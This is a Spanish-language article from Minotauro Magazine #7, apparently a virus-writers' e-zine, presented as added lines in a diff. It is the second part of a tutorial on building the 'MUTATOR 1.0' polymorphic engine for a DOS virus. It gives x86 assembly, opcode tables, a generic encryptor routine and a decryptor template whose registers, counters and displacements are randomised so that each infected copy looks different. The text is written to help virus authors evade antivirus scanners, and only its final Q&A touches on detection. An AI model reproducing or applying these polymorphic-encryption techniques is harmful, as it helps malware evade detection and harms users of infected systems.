@@ -1,0 +1,546 @@
+Minotauro Magazine #7:
+			  MUTATOR 1.0 (Segunda parte)
+				Por Lapidario
+
+LA HISTORIA CONTINUA ...
+
+	Dediquemos ahora la atencion a formar el encriptor. Esto debemos 
+realizarlo antes de generar el desencriptor, pues nos basamos en que armaremos
+el mismo en funcion de que instrucciones usemos para encriptar. Como vimos 
+definimos por decreto que aplicaremos las operaciones de encriptacion a BYTES.
+Y como no nos interesa que sea variable siempre utilizamos los mismos registros
+de puntero y contador. De las intrucciones que definimos anteriormente algunas 
+nesecitaran un valor aleatorio (lo llamamos XX). De la misma manera que se hizo
+con las intrucciones ppi los codigos de operacion de las instrucciones para 
+encriptar y las de desencriptar iran en sendos vectores. 
+Como separador usamos el valor 01.
+Por default yy suponemos que es AL para llenar el vector.
+Por default XX pondremos AAh.
+
+Encriptar:                              Desencriptar:
+
+add al,XXh ............................. sub yy,XXh
+sub al,XXh ............................. add yy,XXh
+xor al,XXh ............................. xor yy,XXh
+ror al ................................. rol yy
+rol al ................................. ror yy
+inc al ................................. dec yy
+dec al ................................. inc yy
+not al ................................. not yy
+
+ins_enc db 04h,0aah,01h,2ch,0aah,01h,34h,0aah,01h,0d0h,0c8h,01h,0d0h
+        db 0c0h,01h,0feh,0c0h,01h,0feh,0c8h,01h,0f6h,0d0h,01h ;8 
+
+des_enc db 02ch,0aah,01h,04h,0aah,01h,34h,0aah,01h,0d0h,0c0h,01h,0d0h 
+        db 0c8h,01h,0feh,0c8h,01h,0feh,0c0h,01h,0f6h,0d0h,01h ;8 
+
+Para variar el parametro XX, simplente cada vez que se llama a la rutina 
+mutator esta llamara a la rutina cambiaxx que se encarga con simples MOV de 
+adecuar estos valores segun un numero aleatorio. Luego nos ocuparemos de 
+los yy. 
+
+Bien ahora debemos saber cuantas instrucciones usamos para encriptar y cuales
+de ellas. Cuantas es facil (0 a 8) ...
+Cuales se usan, se eligen al azar ... (1 a 8)
+
+De esto se encarga una subrutina llamada decoderrut, que realiza las siguientes
+funciones:
+
+La maxima cantidad de instrucciones a usar en el encriptador esta definida en 
+la EQU llamada cu_ins_cod. Como vimos el balor maximo es 8.
+
+Arma dos vectores con la siguiente forma:
+
+VECTOR 1:
+
+1) elemento : cantidad de instrucciones (como maximo puede ser 8)
+2) elemento : 1 instruccion con la que se encriptar
+3) elemento : 2 instruccion con la que se encriptar
+etc ...
+
+Por lo tanto este vector puede tener como maximo 17 Bytes. A este vector lo 
+llamamos crip_code:
+
+crip_code db 17 dup (0)
+
+VECTOR 2:
+
+1) elemento : cantidad de instrucciones (como maximo puede ser 8)
+2) elemento : 1 instruccion con la que se desencripta
+3) elemento : 2 instruccion con la que se desencripta
+etc ...
+
+Por lo tanto este vector puede tener como maximo 17 Bytes. A este vector lo 
+llamamos descrip_code:
+
+descrip_code db 17 dup (0)
+ 
+Supongase que el primer vector contenga las siguientes instrucciones en este 
+orden ...
+
+add....not....inc....sub
+
+El segundo debera terminar teniendo este orden para una desencripcion 
+coherente ...
+
+add....dec....not.....sub
+
+Una descripcion por pasos de lo que realiza la subrutina decoderrut es la 
+siguiente:
+
+0) Inicializa los vectores crip_code y descrip_code con cero.
+1) Genera un numero aleatorio rand0 comprendido en el rango de (0 y cu_ins_cod)
+2) Alamacena el susodicho numero en crip_code y descrip_code.
+3) Es rand0 igual a cero ? Si es asi termina.
+4) Inicializa un bucle desde rand0 hasta cero realizando las siguientes tareas:
+4.1) Genera un numero aleatorio rand2 en rango (1-8).  
+4.2) Busca la instruccion numero rand2 en el vector ins_enc.
+4.3) Traslada esa instruccion a el vector crip_code.
+4.4) Busca la instruccion numero rand2 en el vector des_enc.
+4.5) Traslada esa instruccion a el vector descrip_code.
+5) Invierte las instrucciones del vector descrip_code.
+
+Supongamos ahora que con la informacion que tenemos en el vector 2 podemos 
+formar el desencriptor. Entonces damos por sentado que la copia imagen del 
+virus se encuentra en las condiciones que indica el siguiente grafico.
+
+original_ES:original_DI:..........    
+                        ..........
+                        desencriptor
+                        y instrucciones
+                        PPI.
+                        ....<------------ins_counterx
+                      
+En el offset ins_counterx debemos poner la copia encriptada segun la rutina de
+encriptacion genera. Esto lo hacemos de la siguiente manera: 
+La rutina mutator posee un encriptador generico de la siguiente forma:
+
+ge_encrip    proc near
+             pusha
+             push es
+             push ds
+
+;llenar 16 nop apartir del offset todosnop
+;copiar tantos word como contenga [crip_code] a el offset todosnop
+;fuente de word empieza en el offset crip_code + 1.
+
+             mov cx,DS:[BX+original_cx]
+             mov di,DS:[BX+original_di]
+             mov ax,DS:[seg_base+BX]
+             mov es,ax
+             mov ax,DS:[ins_counterx+BX]
+             mov si,ax
+             mov ax,DS:[BX+original_ds]
+             mov ds,ax
+lazo897:     mov al,ds:[di] 
+todosnop:    ...instrucciones.....(al comienzo 16d nop)                                
+             mov ES:[si],ax
+             inc di   
+             inc si
+             inc cs:[ins_counterx+BX]                                   
+             dec cx                                       
+             jnz lazo897
+             pop es
+             pop ds
+             popa
+             ret
+
+Como obserbamos en el offset todosnop originalmente se encuentran 16 
+instrucciones NOP. Estos NOP son repuestos cada vez que se llama a la rutina.
+Bien si ahora trasladamos del vector1 llamado crip_code tantos bytes como 
+indique el primer elemento del vector por 2 a el offset todosnop. Si ejecutamos
+la rutina ge_encrip habremos trasladado el codigo original encriptado a partir
+del offset ins_counterx. Solo basta calcular la longitud final del codigo 
+imagen y devolverselo en cx a el programa que llamo a la mutator.
+
+Bien, llego el momento de armar el desencriptor. Como dato tenemos el vector 
+descrip_code, cuyo primer elemento nos dice cuantas instrucciones hay que 
+poner. Miremos unos detalles ...
+Segun cual sea el registro a utilizar la instruccion tiene 2 o 3 bytes de 
+longitud. Por lo tanto formaremos otro vector con esta tabla de opcodes.
+A este vector lo llamamos tabla_dat. La rutina cambiaxx tambien se encarga de
+reemplazar los ffh por el valor adecuado (este valor no puede ser 01h).
+
+tabla_dat:
+db     	                0F6h,0D0h;	        not al
+db                      0F6h,0D1h;		not cl
+db       		0F6h,0D2h;		not dl
+db       		0F6h,0D3h;		not bl
+db       		0F6h,0D4h;		not ah
+db       		0F6h,0D5h;		not ch
+db       		0F6h,0D6h;		not dh
+db   		        0F6h,0D7h;		not bh
+db     		        0FEh,0C0h;		inc al
+db       		0FEh,0C1h;	        inc cl
+db       		0FEh,0C2h;		inc dl
+db       		0FEh,0C3h;		inc bl
+db                      0FEh,0C4h;		inc ah
+db                      0FEh,0C5h;		inc ch
+db                      0FEh,0C6h;	        inc dh
+db                      0FEh,0C7h;	        inc bh
+db                      0FEh,0C8h;	        dec al
+db                      0FEh,0C9h;	        dec cl
+db                      0FEh,0CAh;	        dec dl
+db                      0FEh,0CBh;	        dec bl
+db       0FEh,0CCh;				     dec ah
+db       0FEh,0CDh;				     dec ch
+db       0FEh,0CEh;				     dec dh
+db       0FEh,0CFh;				     dec bh
+db       0D0h,0C8h;				     ror al,1
+db       0D0h,0C9h;				     ror cl,1
+db       0D0h,0CAh;				     ror dl,1
+db       0D0h,0CBh;				     ror bl,1
+db       0D0h,0CCh;				     ror ah,1
+db       0D0h,0CDh;				     ror ch,1
+db       0D0h,0CEh;				     ror dh,1
+db       0D0h,0CFh;				     ror bh,1
+db       0D0h,0C0h;				     rol al,1
+db       0D0h,0C1h;				     rol cl,1
+db       0D0h,0C2h;				     rol dl,1
+db       0D0h,0C3h;				     rol bl,1
+db       0D0h,0C4h;				     rol ah,1
+db       0D0h,0C5h;				     rol ch,1
+db       0D0h,0C6h;				     rol dh,1
+db       0D0h,0C7h;				     rol bh,1
+entrada1:
+db       04h,0FFh;				     add al,0ffh
+db       80h,0C1h,0FFh  ;		             add cl,0ffh
+db       80h,0C2h,0FFh	;			     add dl,0ffh
+db       80h,0C3h,0FFh	;			     add bl,0ffh
+db       80h,0C4h,0FFh	;			     add ah,0ffh
+db       80h,0C5h,0FFh	;			     add ch,0ffh
+db       80h,0C6h,0FFh	;			     add dh,0ffh
+db       80h,0C7h,0FFh	;			     add bh,0ffh
+db       2Ch,0FFh	;			     sub al,0ffh
+db       80h,0E9h,0FFh	;			     sub cl,0ffh
+db       80h,0EAh,0FFh	;			     sub dl,0ffh
+db       80h,0EBh,0FFh	;			     sub bl,0ffh
+db       80h,0ECh,0FFh	;			     sub ah,0ffh
+db       80h,0EDh,0FFh	;			     sub ch,0ffh
+db       80h,0EEh,0FFh	;			     sub dh,0ffh
+db       80h,0EFh,0FFh	;			     sub bh,0ffh
+db       34h,0FFh 	;			     xor al,0ffh
+db       80h,0F1h,0FFh	;			     xor cl,0ffh
+db       80h,0F2h,0FFh	;			     xor dl,0ffh
+db       80h,0F3h,0FFh	;			     xor bl,0ffh
+db       80h,0F4h,0FFh	;			     xor ah,0ffh
+db       80h,0F5h,0FFh	;			     xor ch,0ffh
+db       80h,0F6h,0FFh	;			     xor dh,0ffh
+db       80h,0F7h,0FFh	;			     xor bh,0ffh
+
+
+Bien en el primer byte del vector descrip_code tenemos cuantas instrucciones
+efectivas conforman nuestro desencriptor. Nuestro objetivo consiste en formar
+un nuevo vector llamado efect_code que poseea la siguiente estructura:
+1 instruccion registro permutado
+separador 01
+2 instruccion registro permutado
+sepadoror 01
+enesima instruccion registro permutado
+separador 01
+La idea es generar un numero de rango 0 a 7, este sera el numero llave para 
+elegir cual registro usamos y lo guardamos en keyreg. Es necesario guardarlo
+pues luego lo nesesitaremos. Haremos una rutina que lea los dos bytes de el 
+vector descrip_code de la instruccion x usada para desencriptar y busque en 
+el vector tabla_dat el comienzo de la direccion de acierto de comparacion. De
+ordinario si la instrucion x era add al,0ffh el puntero se detendra en en el 
+offset que indica el comienzo de la intruccion add al, 0ffh del vector 
+tabla_dat. Pues si ahora a este offset le sumamos el numero aleatorio por 3 -1
+si el contenido de ese offset es distinto a f6 o fe o d0, o el numero aleatorio
+por 2 en caso contrario, obtendremos el offset donde empieza la instruccion con
+registro permutado.
+
+Entonces :
+Si el contenido del nuevo offset es 80h traslada 3 bytes, desde el vector 
+tabla_dat a el vector efect_code, sino solo dos. Luego insertamos el separador
+01. Repetimos el proceso como instrucciones contenga el vector descrip_code.
+Se desprende que la longitud maxima del vector efect_code sera 3*8+8=32 bytes.
+Esta tarea la realiza la rutina permutareg.
+
+Ahora con el vector efect_code y la variable keyreg estamos en condiciones de
+formar el desencriptor. Al igual que con el encriptor partimos de un codigo 
+base el cual modificaremos segun la nesecidad y luego lo copiamos al comienzo
+del viri imagagen.
+
+Para el desencriptor debemos elegir cual registro usaremos para realizar el 
+calculo del offset delta. Podra ser BX, DI, SI o BP. La restriccion es que si
+bl o bh fue usado para formar las intrucciones con registro permutado no lo 
+podremos usar. Por ese motivo guardamos el dato en keyreg. Otro cuestion es 
+que segun cual registro usemos habra que tener en cuenta cual es el segmento 
+base a utilizar.
+
+Si se usa DI, SI o BX    segmento base es DS.
+Si se usa BP             segmento base es SS.
+
+Una solucion seria poner en las intrucciones de carga o descarga a o desde 
+memoria (que en la rutina de desencriptacion son 2) como prefijo de segmento
+a CS.
+
+Otra forma seria que segun cual fue el registro usado hacer que mientras se 
+ejecuta la rutina de desencriptacion el segmento base requerido tenga el valor
+adecuado.
+
+ejemplo se usa BP.
+
+push ss
+push cs
+pop  ss
+...
+...
+...
+pop ss
+
+
+se usa otro DI o DX o SI .(genericamente gg)
+
+push gg
+push cs
+pop  gg
+...
+...
+...
+pop gg
+
+Como no me gusta poner el prefijo de CS: Usaremos el segundo metodo.
+
+NOTA: (xlsbi=x bits menos significativos)
+
+Tambien debemos elegir cual registro usaremos como counter. Le cabe la mismas
+consideraciones habladas antes, podra ser cualquiera. Mientras no concuerde con
+el usado en regkey y el BX si este fue usado en el calculo del offset beta.
+
+Supongamos que usamos el siguiente desencriptador generico:
+
+p1:                  push gg
+db         01h
+p2:                  push cs
+db         01h          
+p3:                  pop  gg
+db         01h         
+p4:                  call 0000
+db         01h
+p5:                  pop jj
+db         01h
+p6:                  add jj,zzzz
+db         01h
+p7:                  mov counter,cccc
+db         01h 
+p8:                  mov yy,[jj]
+db         01h   
+p9:                  mov [jj],yy
+db         01h
+p10:                 inc jj
+db         01h
+p11:                 dec counter
+p12:                 jnz p8
+db         01h
+p13:                 pop gg
+db         01h
+
+Este desencriptador lo variaremos segun corresponda teniendo en cuenta lo 
+siguiente:
+
+En keyreg tenemos: al,ah,cl,ch,bl,bh,dl,dh  0 a 7.
+
+genero jj y lo guardo en keyjj rango 3 a 7 excluido 04.
+jj; DI,SI,BP  y si keyreg <> a 3 o 7 tambien puede ser BX.
+
+                            pop jj
+
+jj=03 entonces bx     opcode      5B
+jj=05 entonces bp     opcode      5D
+jj=06 entonces si     opcode      5E 
+jj=07 entonces di     opcode      5F 
+
+Estructura del pop jj.
+
+    0101 1(3lsbi de keyjj)
+
+entonces la instruccion inc jj
+
+jj=03 entonces bx     inc bx      opcode 43
+jj=05 entonces bp     inc bp      opcode 45
+jj=06 entonces si     inc si      opcode 46 
+jj=07 entonces di     inc di      opcode 47
+
+Estructura del inc jj 
+
+    0100 (4lsbit de keyjj)
+
+gg; DS o SS  si jj igual a 06 o 07 (di o si) entonces gg=ds
+
+             push ds       opcode    1e
+             pop  ds       opcode    1f
+
+             si jj = 05 (bp)           entonces gg=ss
+              
+             push ss       opcode    16
+             pop ss        opcode    17
+    
+la instruccion add jj,zzzz
+
+add bx,zzzz           81 c3 zz zz
+add bp,zzzz           81 c5 zz zz 
+add si,zzzz           81 c6 zz zz
+add di,zzzz           81 c7 zz zz
+
+Estructura del add jj,zzzz
+
+        10000001 | 1100(4lsbi de keyjj) | zz | zz
+
+genero counter y lo guardo en keycounter  rango 0-3
+
+keyjj = 03 (BX) keycounter no puede ser 03 (BX).
+
+si keyreg = 00 (al) o 04 (ah) keycounter no puede ser 00 (AX)  
+si keyreg = 01 (cl) o 05 (ch) keycounter no puede ser 01 (CX)  
+si keyreg = 02 (dl) o 06 (dh) keycounter no puede ser 02 (DX)  
+si keyreg = 03 (bl) o 07 (bh) keycounter no puede ser 03 (BX)  
+
+keycounter =  00  ax
+keycounter =  01  cx
+keycounter =  02  dx
+keycounter =  03  bx
+
+entonces la instruccion dec counter
+
+keycounter =  00  ax   dec ax         opcode 48
+keycounter =  01  cx   dec cx         opcode 49
+keycounter =  02  dx   dec dx         opcode 4a
+keycounter =  03  bx   dec bx         opcode 4b
+
+Estructura del dec counter:
+
+
+   10001(3lsbi de key keycounter)
+
+
+entonces la instruccion mov counter,cccc
+
+keycounter =  00  ax   mov ax,cccc         opcode b8 cc cc
+keycounter =  01  cx   mov cx,cccc         opcode b9 cc cc
+keycounter =  02  dx   mov dx,cccc         opcode ba cc cc 
+keycounter =  03  bx   mov bx,cccc         opcode bb cc cc
+
+Estructura del mov counter,cccc
+
+       10111(3lsbi de keycounter) | cc | cc
+
+genero yy rango 0-7 y lo guardo en keyyy
+yy no puede ser igual a keycounter o a keycounter+4.
+y ademas no puede ser igual keyreg.
+
+keyyy=00 entonces al
+keyyy=01 entonces cl
+keyyy=02 entonces dl
+keyyy=03 entonces bl
+keyyy=04 entonces ah
+keyyy=05 entonces ch
+keyyy=06 entonces dh
+keyyy=07 entonces bh
+
+
+Este numero afecta a las intrucciones mov yy,[jj] y mov [jj],yy
+Hay aproximadamente a simple vista 28 convinaciones.
+Veamos la estructura.
+
+100010dw mod reg r/m
+
+d=1     a reg.  caso mov yy,[jj] 
+d=0 desde reg.  caso mov [jj],yy
+
+w=0  byte instruccion     nuestro caso.
+
+mod = 00 entonces r/m indica como debe entenderse r/m. nuestro caso.
+
+r/m = 100 entonces EA (SI)+disp
+r/m = 101 entonces EA (DI)+disp
+r/m = 110 entonces EA (BP)+disp (1)
+r/m = 111 entonces EA (BX)+disp
+ 
+EA= direccion efectiva.
+disp=desplazamiento.
+
+Observese dos cosas.
+1) la unica diferencia entre mov yy,[jj] y mov [jj],yy es un bit.
+2) Como disp es siempre cero la instrucion ocupa 2 bytes ,pero
+   si jj es bp ocupa 3 pues el desplazamiento 0 no se puede obviar.
+
+Para solucionar esto podriamos poner siempre un dezplazamiento 
+aleatorio y tenerlo en cuenta cuando hacemos el add jj,zzzz
+Para hacer esto mod debe ser 01.
+Al desplazamiento lo llamamos qq , tiene un rango (0-127)
+y lo guardamos en keyqq.
+
+Veamos como se forman los tres bytes.
+
+mov yy,[jj]
+ 
+10001010 | 01(3lsbi de keyyy)1(2lsbi de magia) | [keyqq]
+
+mov [jj],yy
+
+10001000 | 01(3lsbi de keyyy)1(2lsbi de magia) | [keyqq]
+
+Segun sea keyjj por comparacion allamos el r/m necesario y 
+armamos la instruccion.
+
+La rutina generakey genera los valores adecuados de
+keyjj,keycounter,keyyy,keyqq , teniendo en cuenta las restricciones
+pertinentes en cada caso.
+
+Con todo esto estamos en condiciones de ajustar la rutina de 
+desencriptacion generica.
+
+La rutina trasscod ajusta a la rutina de  desencriptacion generica ,
+con los valores allados por la rutina generakey.
+
+Luego iremos copiando instruccion por instruccion a la direccion 
+original dada por ES:DI intercalando intrucciones PPI.
+Al hacer esto memorizaremos algunos offset para luego poner
+el valor adecuado.
+
+OFFSET a memorizar.
+
+a) donde queda p4     ; para ajustar  zzzz
+b) donde queda p6     ; para ajustar  zzzz
+c) donde queda p7     ; para ajustar  cccc
+d) donde queda p8     ; para calcular el salto de jnz
+d) donde queda p12    ;  "      "      "      "
+
+Esto lo realiza la rutina copiar.
+Una vez realizado esto llamamos a la rutina de encriptacion,y luego
+calculamos la longitud final para devolverlo en cx.
+ 
+Bien con esto terminamos la explicacion de el polimorfico.
+Espero que se halla entendido.
+Dudas, consultas, reportes de bug o insultos al BBS.
+
+PLANTEANDO INQUIETUDES:
+
+SERIA SENCILLO HACER UN PROGRAMA QUE IDENTIFIQUE SI UN DADO ARCHIVO TIENE 
+UNA ALTA POSIBILIDAD DE ESTAR USANDO EL POLIMORFISMO  DE LA MUTATOR?
+
+Bien yo digo que si, es relativamente sencillo, debido (no es condicion 
+nesesaria pero si facilita el tener que desensamblar) a que tienen el fuente 
+y saben cual es el desencriptor generico. Solo hay que separar trigo de la 
+paja y pensar un poquito ...
+
+SE PUEDE CALCULAR DE CUANTAS FORMAS ES POSIBLE MUTAR EL CODIGO ENCRIPTADO?
+
+Bien yo digo que si, es mas ... afirmo que es posible con el algoritmo adecuado
+desencriptar el codigo encriptado ... En esta mutacion es relativamente facil 
+ya que lo unico que hay que saber es que pueden ser x de 8 instrucciones 
+univocas para encriptar (8>x>0) ... asi que ... correlacionando y esas yerbas.
+
+ES POSIBLE QUE EN UNA MUTACION TERMINE SIN ENCRIPTAR EL CODIGO?
+
+Si puede darse el caso que la combinacion de instrucciones usadas para 
+encriptar en realidad terminen NO encriptando.
+
+ES POSIBLE DEDUCIR CUANTAS DE TODAS LAS POSIBLES CUMPLEN LA PREGUNTA ANTERIOR?
+
+Si es posible saberlo. Si alguien quiere discutir algun punto (antivirus 
+programer, GISVI, Bonsembiante, Ludwing etc etc etc ... y otros) puede hacerlo.
+
+Lapidario [DAN]
